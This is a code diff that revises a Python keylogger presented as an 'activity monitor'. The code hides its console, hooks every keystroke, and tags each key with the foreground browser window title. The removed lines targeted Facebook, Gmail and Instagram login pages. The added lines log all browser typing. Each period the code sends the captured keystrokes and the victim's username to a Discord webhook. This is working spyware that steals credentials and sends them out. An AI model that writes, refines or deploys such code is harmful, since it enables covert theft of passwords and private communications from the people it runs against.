@@ -10,12 +10,11 @@ from threading import Timer
 from datetime import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
-SEND_REPORT_EVERY = 60  # Set the interval in seconds
+SEND_REPORT_EVERY = 60  # Interval in seconds
 WEBHOOK = "WEBHOOK_URL_HERE"
 
 # Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-
 
 class ActivityMonitor:
     def __init__(self, interval, report_method="webhook"):
@@ -23,59 +22,46 @@ class ActivityMonitor:
         self.report_method = report_method
         self.log = []
         self.start_time = datetime.now().strftime('%d/%m/%Y %H:%M')
-        self.username = os.getlogin()
+        self.username = os.getenv("USERNAME", "Unknown")
         self.is_running = True
         self.last_window = ""
         self.current_form_fields = set()
+        self.supported_browsers = ["chrome.exe", "msedge.exe", "firefox.exe"]
 
     def get_active_window_info(self):
         """Get information about the active window."""
         try:
             window = win32gui.GetForegroundWindow()
             title = win32gui.GetWindowText(window)
-            pid = win32process.GetWindowThreadProcessId(window)[1]
+            _, pid = win32process.GetWindowThreadProcessId(window)
             process = psutil.Process(pid)
             return {
                 'title': title,
-                'process_name': process.name(),
+                'process_name': process.name().lower(),
                 'pid': pid
             }
-        except Exception as e:
-            logging.error(f"Error getting window info: {e}")
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
+            logging.warning(f"Error getting window info: {e}")
             return None
 
     def detect_browser_activity(self, window_info):
-        """Detect and categorize browser activity."""
+        """Detects browser activity."""
         if not window_info:
             return None
-
+        
         title = window_info['title'].lower()
-        process = window_info['process_name'].lower()
-
-        if "chrome.exe" in process and title != self.last_window:
-            self.last_window = title
-            return "The user opened Google Chrome"
-
-        if "chrome.exe" in process and "google" in title:
-            if "facebook" in title and "search" in title:
-                return "The user searched for Facebook"
-
-        if "chrome.exe" in process and "facebook" in title and "log in" in title:
-            return "The user accessed Facebook login page"
-
-        if "chrome.exe" in process and "gmail" in title and "sign in" in title:
-            return "The user accessed Gmail login page"
-
-        if "chrome.exe" in process and "instagram" in title and "log in" in title:
-            return "The user accessed Instagram login page"
-
+        process = window_info['process_name']
+        
+        if process in self.supported_browsers:
+            if title != self.last_window:
+                self.last_window = title
+                return f"User opened {title} in {process}"
         return None
 
     def callback(self, event):
-        """Handles key press events and logs them with context."""
+        """Handles key press events and logs them."""
         key = event.name
         timestamp = datetime.now().strftime('%H:%M:%S')
-
         window_info = self.get_active_window_info()
 
         key_mappings = {
@@ -91,39 +77,33 @@ class ActivityMonitor:
         }
         key = key_mappings.get(key, f"[{key.upper()}]" if len(key) > 1 else key)
 
-        if window_info and ("facebook" in window_info['title'].lower() or
-                            "gmail" in window_info['title'].lower() or
-                            "instagram" in window_info['title'].lower()):
-            if len(self.current_form_fields) < 2:
-                self.current_form_fields.add(key)
-                if len(self.current_form_fields) == 2:
-                    self.log.append(f"[{timestamp}] Detected login attempt on {window_info['title']}")
-
-        self.log.append(f"[{timestamp}] {key}")
-
+        if window_info and window_info['process_name'] in self.supported_browsers:
+            self.log.append(f"[{timestamp}] {window_info['title']}: {key}")
+        
         activity = self.detect_browser_activity(window_info)
         if activity:
             self.log.append(f"[{timestamp}] {activity}")
 
     def format_log(self):
-        """Formats the logged activities into a readable string."""
+        """Formats the log into a readable string."""
         return "\n".join(self.log)
 
     def report_to_webhook(self):
-        """Sends the logged activities to Discord via webhook."""
+        """Sends the log data to Discord webhook."""
         try:
             webhook = DiscordWebhook(url=WEBHOOK)
             log_text = self.format_log()
 
+            if not log_text:
+                return
+            
             if len(log_text) > 2000:
                 temp_path = os.path.join(os.getenv("TEMP"), "activity_report.txt")
                 with open(temp_path, "w", encoding="utf-8") as file:
                     file.write(f"Activity Report - {self.username} ({self.start_time})\n\n")
                     file.write(log_text)
-
                 with open(temp_path, "rb") as file:
                     webhook.add_file(file=file.read(), filename="activity_report.txt")
-
                 os.remove(temp_path)
             else:
                 embed = DiscordEmbed(
@@ -132,7 +112,7 @@ class ActivityMonitor:
                     color=16711680
                 )
                 webhook.add_embed(embed)
-
+            
             response = webhook.execute()
             if response.status_code != 200:
                 logging.error(f"Webhook Error: {response.status_code}")
@@ -140,11 +120,10 @@ class ActivityMonitor:
             logging.error(f"Error sending webhook: {e}")
 
     def report(self):
-        """Handles periodic reporting and clears the log."""
+        """Handles periodic reporting."""
         if self.log:
-            if self.report_method == "webhook":
-                self.report_to_webhook()
-            self.log = []
+            self.report_to_webhook()
+            self.log.clear()
             self.current_form_fields.clear()
 
         if self.is_running:
@@ -161,12 +140,11 @@ class ActivityMonitor:
             )
 
     def start(self):
-        """Starts the activity monitor."""
+        """Starts monitoring."""
         self.hide_console()
         keyboard.on_release(callback=self.callback)
         self.report()
         keyboard.wait()
-
 
 if __name__ == "__main__":
     monitor = ActivityMonitor(interval=SEND_REPORT_EVERY, report_method="webhook")
